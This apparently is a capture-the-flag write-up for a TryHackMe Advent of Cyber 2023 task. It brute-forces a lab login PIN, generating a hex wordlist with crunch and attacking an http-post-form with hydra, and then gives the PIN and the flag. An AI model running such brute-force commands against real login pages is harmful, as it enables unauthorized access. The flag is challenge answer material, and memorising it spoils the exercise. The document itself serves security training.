# Brute-forcing Hydra is Coming to Town

---

### Learning Objectives
After completing this task, you will understand:

Password complexity and the number of possible combinations
How the number of possible combinations affects the feasibility of brute force attacks
Generating password combinations using crunch
Trying out passwords automatically using hydra

---

After the machine is up go to http://machine_ip:8000/login.php

You will be prompted like this:

<img width="1303" alt="Screenshot 2023-12-22 at 1 36 47 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/4c294cb3-7854-4826-9194-fdd4f5e789e5">

---

So basically we need to bruteforce the pin.

for that we need a passwordlist.

TO Generating the Password List. We will use crunch

command: ```crunch 3 3 0123456789ABCDEF -o 3digits.txt```

---

### Using the password list.

<img width="1212" alt="Screenshot 2023-12-22 at 1 47 11 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/ec955e08-843d-4c81-b5d7-c7c138c73c14">

---

***To brute force with hydra***

```
hydra -l '' -P 3digits.txt -f -v 10.10.139.12 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

***After a while you encounter control.php insted of error.php then you will get the pin.***

---

<img width="1011" alt="Screenshot 2023-12-22 at 1 49 25 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/bd7f0586-8f45-4e09-b8d4-44c7cad08727">

PIN
```
6F5
```

flag
```
THM{pin-code-brute-force}
```




